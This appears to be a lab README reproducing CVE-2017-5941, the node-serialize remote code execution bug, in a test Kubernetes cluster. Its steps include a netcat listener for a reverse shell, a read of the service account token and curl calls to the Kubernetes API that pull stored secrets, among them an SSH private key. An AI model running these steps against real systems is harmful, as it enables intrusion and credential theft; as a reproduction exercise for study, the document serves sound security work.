## CVE-2017-5941
https://nvd.nist.gov/vuln/detail/CVE-2017-5941#range-6741888 \
Target Application: Node \
Software Link: https://www.npmjs.com/package/node-serialize \
Version: 0.0.4 \
Writeup: https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/ \
Used PoCs: 
* https://packetstormsecurity.com/files/161356/Node.JS-Remote-Code-Execution.html
* https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/

### Steps to Reproduce

1- `minikube start` \
2- `kubectl apply -f scenario-3-server.yaml` \
3- Create a test github account, generate SSH key and add to this account, we used an account with temporary mail.
4- Generate and add secret with base64 encoding with `kubectl create secret generic github-ssh-key --from-file=ssh-privatekey=/path/to/github_key`
3- Forward port `kubectl port-forward pods/scenario-3-server-deployment-c9b7c56cf-ggvgm 4242:4242` \
4- Listen on port `1234` and your ip for TCP connections like `nc -l 144.122.139.40 1234` \
5- Run poc.py with your ip `./poc.py 144.122.139.40` \
6- install curl with `apt-get -y update; apt-get -y install curl`
7- Because of the misconfigured permissions, attacker can access the secrets with `TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)`
8- Get pods with `curl --insecure --header "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces/default/pods`
7- Get secrets (the SSH Key) with Kubernetes API calls `curl --insecure --header "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces/default/secrets`
8- Attacker now has the ssh-privatekey
9- Attacker finds the repository url (which is https://github.com/exploit-me-co/exploit-this) in server.js, now they can access the repository with full access.
